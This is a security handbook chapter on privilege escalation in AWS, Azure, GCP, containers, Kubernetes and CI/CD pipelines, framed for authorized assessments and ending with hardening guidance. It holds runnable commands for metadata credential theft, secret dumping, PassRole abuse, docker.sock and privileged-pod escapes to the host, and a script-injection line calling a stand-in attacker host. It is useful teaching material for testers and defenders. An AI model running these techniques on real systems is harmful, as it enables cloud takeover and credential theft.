# Modern Cloud and Container Privilege Escalation

> **Privilege Escalation Handbook** — File 06  
> AWS, Azure, GCP, containers, Kubernetes, and CI/CD  
> Authorized cloud assessments only — watch for production blast radius

---

## Table of Contents

1. [Cloud Privesc Mindset](#1-cloud-privesc-mindset)
2. [AWS Privilege Escalation](#2-aws-privilege-escalation)
3. [Azure / Entra ID Privilege Escalation](#3-azure--entra-id-privilege-escalation)
4. [GCP Privilege Escalation](#4-gcp-privilege-escalation)
5. [Container Escape Techniques](#5-container-escape-techniques)
6. [Kubernetes Privilege Escalation](#6-kubernetes-privilege-escalation)
7. [CI/CD Pipeline Attacks](#7-cicd-pipeline-attacks)
8. [Cross-Cutting Patterns](#8-cross-cutting-patterns)
9. [Detection & Hardening](#9-detection--hardening)
10. [References](#10-references)

---

## 1. Cloud Privesc Mindset

### 1.1 Differences From Host Privesc

| Classic host | Cloud |
|--------------|-------|
| Root/SYSTEM on one box | Control plane API permissions |
| Local file creds | IAM roles, tokens, metadata |
| Patch kernel | Misconfigured policies & trust |
| Persistence on disk | Keys, roles, backdoor users, lambdas |

### 1.2 Universal Playbook

1. **Identify identity** — role, service principal, SA, instance profile  
2. **Enumerate permissions** — effective policy, not just attached names  
3. **Find privilege paths** — create user, pass role, self-escalate  
4. **Abuse data plane** — secrets, storage, CI variables  
5. **Expand** — org/management group/folder hierarchy  

### 1.3 Metadata Service Warning

Cloud instance metadata endpoints are high-value. SSRF to metadata is a classic path to role credentials.

> **Pro tip:** In every cloud engagement, map **who can assume what** and **where secrets live** before chasing exotic CVEs.

---

## 2. AWS Privilege Escalation

### 2.1 Identity Types

| Identity | Notes |
|----------|-------|
| IAM user | Long-lived access keys |
| IAM role | Assumed via STS; preferred |
| Instance profile | EC2 role via metadata |
| Federated / SSO | Temporary creds |
| Service-linked roles | AWS services |

### 2.2 EC2 Instance Metadata

**IMDSv1 (less safe):**

```bash
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

**IMDSv2 (session token required):**

```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Export:

```bash
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
```

### 2.3 SSRF → Metadata

If a web app fetches URLs, try:

```text
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Mitigations: IMDSv2 hop limit, blocking metadata from app layers, SSRF fixes.

### 2.4 Core Enumeration

```bash
aws sts get-caller-identity
aws iam get-user
aws iam list-attached-user-policies --user-name NAME
aws iam list-user-policies --user-name NAME
aws iam list-groups-for-user --user-name NAME
aws iam simulate-principal-policy --policy-source-arn ARN --action-names iam:CreateUser sts:AssumeRole
```

For roles:

```bash
aws iam get-role --role-name NAME
aws iam list-attached-role-policies --role-name NAME
aws iam get-policy-version --policy-arn ARN --version-id v1
```

### 2.5 Common IAM Privilege Escalation Patterns

Documented extensively by Rhino Security / others. Examples:

| Permission | Abuse |
|------------|-------|
| `iam:CreatePolicyVersion` | Set default policy to `*:*` |
| `iam:SetDefaultPolicyVersion` | Roll back to permissive version |
| `iam:PassRole` + `ec2:RunInstances` | Launch instance with privileged role |
| `iam:PassRole` + `lambda:CreateFunction` + invoke | Run code with privileged role |
| `iam:CreateAccessKey` | Create keys for privileged user |
| `iam:CreateLoginProfile` | Console password for user |
| `iam:AttachUserPolicy` / `PutUserPolicy` | Self-attach admin |
| `iam:UpdateAssumeRolePolicy` | Trust yourself on privileged role |
| `sts:AssumeRole` broad trust | Hop into higher roles |
| `iam:PassRole` + `glue:` / `sagemaker:` / `cloudformation:` | Many pass-role sinks |

**PassRole + Lambda sketch:**

```bash
aws lambda create-function --function-name pwn \
  --runtime python3.11 \
  --role arn:aws:iam::ACCOUNT:role/PrivilegedRole \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://func.zip
aws lambda invoke --function-name pwn out.txt
```

### 2.6 S3

```bash
aws s3 ls
aws s3 ls s3://bucket --recursive
aws s3 cp s3://bucket/secrets/ . --recursive
```

Risks: public buckets, confused deputy, writable buckets hosting backdoored static sites/artifacts, backup buckets with AMIs/snapshots.

### 2.7 Lambda

```bash
aws lambda list-functions
aws lambda get-function --function-name NAME
# Pull code, env vars with secrets
```

Abuse: update function code if `lambda:UpdateFunctionCode`; event source injections; layer poisoning.

### 2.8 Secrets Manager / SSM Parameter Store

```bash
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id NAME
aws ssm get-parameters-by-path --path / --recursive --with-decryption
```

### 2.9 EBS / Snapshots / AMI

Create snapshot of victim volume → share to attacker account → mount → read credentials (classic). Needs `ec2:CreateSnapshot` style rights.

### 2.10 Organizations & Lateral

Compromise of payer / org admin → member accounts. SCPs may still restrict.

### 2.11 Tools

- **Pacu** — AWS exploitation framework  
- **CloudFox** — situational awareness  
- **Principal Mapper / Cloudsplaining / PMapper** — policy graphing  
- **enumerate-iam** — permission brute discovery  

---

## 3. Azure / Entra ID Privilege Escalation

### 3.1 Identity Plane vs Azure RM

| Plane | Examples |
|-------|----------|
| **Entra ID (Azure AD)** | Users, app registrations, roles, groups, Conditional Access |
| **Azure Resource Manager** | Subscriptions, RGs, VMs, Key Vault data plane |

Privesc often jumps between both.

### 3.2 Service Principals & App Registrings

Applications + service principals with client secrets/certificates. Leaked secrets in code/CI are gold.

```bash
az login --service-principal -u APP_ID -p SECRET --tenant TENANT
az ad sp show --id APP_ID
az role assignment list --assignee APP_ID
```

### 3.3 Managed Identities

System/user-assigned identities on VMs, Functions, App Services.

From Azure VM:

```bash
# IMDS
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

Use token against ARM or other resources (`resource=` changes audience — Key Vault, Graph, storage).

### 3.4 High-Value Entra Roles

| Role | Impact |
|------|--------|
| Global Administrator | Full tenant (with CA caveats) |
| Privileged Role Administrator | Grant privileged roles |
| Application Administrator | Creds on apps → often escalate |
| Cloud Application Admin | Similar app abuse |
| Hybrid Identity Admin | On-prem sync paths |
| User Administrator | Reset some passwords |
| Helpdesk Administrator | Limited resets |

### 3.5 App Permission Abuse

Application permissions (app-only) like `Directory.ReadWrite.All`, `AppRoleAssignment.ReadWrite.All`, `RoleManagement.ReadWrite.Directory` enable graph-based escalation.

Flow:

1. Find SP with dangerous Graph roles  
2. Add credentials if you can manage the app  
3. Login as SP → escalate  

### 3.6 Azure RBAC

```bash
az role assignment list --all -o table
az role definition list --name "Owner"
az role definition list --name "Contributor"
```

**Contributor** on subscription ≠ Entra Global Admin, but can often read many secrets, run commands on VMs (run command), and abuse data planes.

**Owner** includes role assignment → self-escalate within scope.

### 3.7 Key Vault

```bash
az keyvault list
az keyvault secret list --vault-name VAULT
az keyvault secret show --vault-name VAULT --name SECRET
```

Access policies vs RBAC models; managed identity often has get/list on secrets.

### 3.8 VM Run Command / Extensions

With compute rights:

```bash
az vm run-command invoke -g RG -n VM --command-id RunShellScript --scripts "id"
```

### 3.9 Token Theft

- Azure CLI tokens on disk (`~/.azure`)  
- Primary refresh tokens (PRT) on AAD-joined devices  
- RoadTools / TokenTactics research tooling for labs  

### 3.10 Tools

- **ROADTools**  
- **Stormspotter** (Azure attack graph — archive awareness)  
- **AzureHound** (BloodHound collection)  
- **MicroBurst** / **PowerZure**  
- **Az** PowerShell / Azure CLI  

---

## 4. GCP Privilege Escalation

### 4.1 Identities

- Google accounts / Cloud Identity users  
- Service accounts  
- Workload identity federations  

### 4.2 Metadata Credentials

From GCE:

```bash
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
```

### 4.3 Enumeration

```bash
gcloud auth list
gcloud config list
gcloud projects list
gcloud iam service-accounts list
gcloud projects get-iam-policy PROJECT
```

### 4.4 Common Privesc Themes

| Permission / role | Abuse |
|-------------------|-------|
| `iam.serviceAccountUser` + resource run | Run as SA on GCE/GCF/GKE |
| `iam.serviceAccountTokenCreator` | Mint tokens for SA |
| `iam.serviceAccountKeys.create` | Long-lived key for SA |
| `resourcemanager.projects.setIamPolicy` | Grant self owner |
| `deploymentmanager` / `cloudbuild` edit | Deploy privileged resources |
| `storage.objects` on sensitive buckets | Creds in TF state, backups |
| `secretmanager.versions.access` | Read secrets |
| `container.admin` | Cluster admin → nodes |

### 4.5 Service Account Impersonation

```bash
gcloud iam service-accounts get-access-token SA@PROJECT.iam.gserviceaccount.com
# or
gcloud print-access-token --impersonate-service-account=SA@...
```

### 4.6 Cloud Storage

```bash
gsutil ls
gsutil cat gs://bucket/terraform.tfstate
```

Terraform state files frequently contain secrets.

### 4.7 Cloud Functions / Run

Update source / env vars if permitted; attach privileged SA at deploy.

### 4.8 Tools

- **GCP Privilege Escalation** checklists (Rhino / HackTricks Cloud)  
- **gcloud** + custom scripts  
- **Forseti** / SCC for defensive inventory  

---

## 5. Container Escape Techniques

### 5.1 Am I in a Container?

```bash
cat /proc/1/cgroup
ls /.dockerenv
mount | head
capsh --print
```

### 5.2 Privileged Containers

```bash
# Often can see host devices
ls /dev
fdisk -l
mount /dev/sda1 /mnt
chroot /mnt
```

`--privileged` disables most isolation — treat as host root equivalent.

### 5.3 Docker Socket Mount

```bash
ls -l /var/run/docker.sock
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh
```

Even without CLI, use curl API against the socket.

### 5.4 Dangerous Capabilities

`CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_DAC_OVERRIDE`, `CAP_SYS_MODULE` inside containers enable multiple escape classes (mount, ptrace host pidns if shared, etc.).

```bash
cat /proc/self/status | grep Cap
```

### 5.5 Host PID / Network / IPC Namespaces

```bash
# If --pid=host
ps aux
# Potential to enter host processes / debug
```

### 5.6 Writable Host Mounts

Bind mounts of `/`, `/var/run/docker.sock`, `/etc`, host cron dirs, or Kubernetes node paths → write SSH keys / cron / binaries.

### 5.7 cgroups release_agent (Historical Class)

Requires specific capability and mount conditions; still taught in labs — validate kernel/container runtime hardening.

### 5.8 Runc / Container Runtime CVEs

Track CVEs in runc, containerd, CRI-O (e.g., historical escapes). Version enumeration:

```bash
runc --version
containerd --version
```

### 5.9 Detection Notes

- Containers running privileged in prod  
- Socket mounts in compose/k8s manifests  
- Unexpected hostPath volumes  

---

## 6. Kubernetes Privilege Escalation

### 6.1 Service Account Tokens

Default older clusters mounted SA tokens in every pod:

```bash
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/$NS/pods
```

### 6.2 Permission Discovery

```bash
kubectl auth can-i --list
kubectl auth can-i create pods --as=system:serviceaccount:ns:sa
kubectl get roles,rolebindings,clusterroles,clusterrolebindings -A
```

### 6.3 Dangerous RBAC Permissions

| Verb / resource | Risk |
|-----------------|------|
| `create` pods | Mount hostPath, privileged pod → node |
| `create` / `patch` deployments | Same |
| `get/list/watch` secrets | Creds across ns |
| `escalate` / `bind` roles | Self-grant admin |
| `impersonate` | Become cluster-admin |
| `create` node / `pods/exec` | Lateral |
| `create` persistentvolumes | Host path tricks |
| wildcard `*` | Cluster admin |

### 6.4 Privileged Pod → Node

If you can create a pod:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: breakout
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: c
    image: alpine
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
    command: ["sleep","infinity"]
  volumes:
  - name: host
    hostPath:
      path: /
```

Then `kubectl exec` and `chroot /host`.

### 6.5 pod/exec into Privileged Workloads

Compromise of low pod → exec into already privileged daemonset (e.g., monitoring) if RBAC allows.

### 6.6 etcd / API Server Exposure

Mis-exposed etcd or anonymous API access → full cluster compromise.

### 6.7 Secrets & ConfigMaps

```bash
kubectl get secrets -A
kubectl get secret NAME -o yaml
# base64 -d
```

### 6.8 Cloud Provider IAM via Nodes

Node instance profiles / identities often over-privileged. Escape to node → metadata → cloud admin path (combine with §2–4).

### 6.9 Tools

- **Peirates** — K8s post-exploitation  
- **kubectl-who-can** / **rakkess**  
- **Kubescape** — misconfig scanning  
- **KubiScan** — risky RoleBindings  
- **kube-hunter** / **kube-bench**  
- **BloodHound-like** mappings via custom collectors  

---

## 7. CI/CD Pipeline Attacks

### 7.1 Why CI/CD Is a Privilege Nexus

Pipelines often hold:

- Cloud access keys  
- Kubernetes kubeconfigs  
- Docker registry creds  
- SSH deploy keys  
- Signing keys  
- Production database URLs  

Compromise of CI = compromise of many environments.

### 7.2 GitHub Actions

**Attack surfaces:**

| Issue | Abuse |
|-------|-------|
| `pull_request_target` misuse | Malicious PR runs with secrets |
| Self-hosted runners | Run arbitrary jobs as runner OS user; often privileged network |
| Overly broad `GITHUB_TOKEN` permissions | Push to main, create releases |
| Untrusted workflow inputs | Script injection in `run:` steps |
| Third-party actions `@main` | Supply chain tag move |
| OIDC role too open | Cloud role assumption from any repo |

**Script injection example pattern:**

```yaml
# Dangerous
run: echo ${{ github.event.issue.title }}
# Attacker title: `"; curl attacker; #`
```

**Self-hosted runner:**

- Job can steal tokens from memory/disk  
- May Docker-sock mount  
- May have cloud metadata access  

**Hardening:** least privilege tokens, pinned action SHAs, no secrets on fork PRs, ephemeral runners, OIDC with tight `sub` claims.

### 7.3 Jenkins

| Issue | Abuse |
|-------|-------|
| Script Console / Groovy | RCE as Jenkins user |
| Build agents with labels | Run on sensitive nodes |
| Credentials plugin store | Decrypt with master key if filesystem access |
| Anonymous read + job build | Trigger malicious pipeline |
| `@Grab` / unsafe pipeline libs | Code exec |

Post-ex:

```groovy
// Historical patterns for dumping credentials — use only in authorized labs
```

Escape to cloud via stored AWS keys; to K8s via kubeconfig credentials.

### 7.4 GitLab CI

| Issue | Abuse |
|-------|-------|
| Privileged runners / Docker-in-Docker | Container escape |
| `CI_JOB_TOKEN` abuse | Cross-project access if weak |
| Protected branch misconfig | Secrets exposure |
| Shared runners multi-tenant leak | Cross-job residual files |
| Malicious `.gitlab-ci.yml` on unprotected branches | Secret exfil if available |

### 7.5 General CI/CD Privesc Flow

```text
Compromise app repo / weak PR controls
        → malicious pipeline
        → steal cloud OIDC/role or long-lived keys
        → cloud admin / cluster-admin
        → production data
```

Or:

```text
Compromise runner OS
        → read job environment secrets
        → push trojaned artifact to registry
        → supply chain to prod
```

### 7.6 Supply Chain Notes

- Poisoned base images  
- Dependency confusion  
- Malicious build cache  
- Unsigned artifacts promoted to prod  

---

## 8. Cross-Cutting Patterns

### 8.1 Secret Sprawl

Search everywhere:

```bash
# Hosts
find / -name "*.tfstate" -o -name ".env" -o -name "credentials" 2>/dev/null
# Git history
git log -p | grep -i akia
```

### 8.2 Confused Deputy / SSRF

App with cloud HTTP client → metadata or internal admin APIs.

### 8.3 Over-Privileged Compute

One EC2/GCE/Azure VM role used by many apps → single SSRF = wide blast radius. Prefer per-app roles.

### 8.4 Control Plane vs Data Plane

Sometimes you cannot list IAM but can read all S3/Key Vault — still critical business impact.

---

## 9. Detection & Hardening

### 9.1 Cloud

| Control | Purpose |
|---------|---------|
| IMDSv2 + hop limit | Reduce SSRF cred theft |
| SCP / Azure Policy / Org Policy | Guardrails |
| Break-glass only for admin | Reduce standing priv |
| CloudTrail / Activity Logs / Admin Activity | Forensics |
| Just-in-time privileged access | PIM / IAM Identity Center |
| Secret scanning + short-lived creds | Limit leak value |

### 9.2 Containers / K8s

- No privileged pods by policy (PSS/PSA, OPA/Gatekeeper, Kyverno)  
- No docker.sock mounts  
- Drop capabilities; read-only root FS  
- Disable automount SA token where unneeded  
- Least-privilege RBAC; no cluster-admin bindings for apps  
- Network policies; secrets encryption at rest  

### 9.3 CI/CD

- Pin actions by SHA  
- Segregate prod secrets  
- Ephemeral, non-privileged runners  
- Required reviews + protected branches  
- OIDC with constrained trust conditions  

---

## 10. References

- [HackTricks Cloud](https://cloud.hacktricks.xyz/)  
- [Rhino Security — AWS IAM Priv Esc](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)  
- [AWS IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)  
- [Microsoft — Azure RBAC](https://learn.microsoft.com/en-us/azure/role-based-access-control/overview)  
- [Microsoft — Managed identities](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/overview)  
- [GCP IAM docs](https://cloud.google.com/iam/docs)  
- [Kubernetes Security Checklist](https://kubernetes.io/docs/concepts/security/)  
- [MITRE ATT&CK Containers](https://attack.mitre.org/matrices/enterprise/containers/)  
- [OWASP CI/CD Security Top 10](https://owasp.org/www-project-top-10-ci-cd-security-risks/)  
- [GitHub — Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)  
- [Pacu](https://github.com/RhinoSecurityLabs/pacu)  
- [Peirates](https://github.com/inguardians/peirates)  

---

## Appendix A: Quick Metadata Endpoints

| Cloud | Endpoint | Header |
|-------|----------|--------|
| AWS | `http://169.254.169.254/` | IMDSv2 token |
| Azure | `http://169.254.169.254/metadata/` | `Metadata: true` |
| GCP | `http://metadata.google.internal/` | `Metadata-Flavor: Google` |

## Appendix B: Engagement Safety

- Disable destructive IAM changes unless approved  
- Prefer read-only enumeration roles first  
- Snapshot / ticket before creating admin users  
- Never leave backdoor access keys  

## Appendix C: Sample Finding Language

```text
[Critical] EC2 instance role admin-equivalent via iam:PassRole + lambda:CreateFunction
Evidence: aws iam simulation + successful function create in non-prod
Impact: Full account takeover potential
Remediation: Remove PassRole to privileged roles; permission boundaries; SCP deny
```

---

*End of File 06 — Modern Cloud and Container Privilege Escalation*  
*Related: File 02 (Docker/LXD host), File 07 (cloud/K8s tools)*
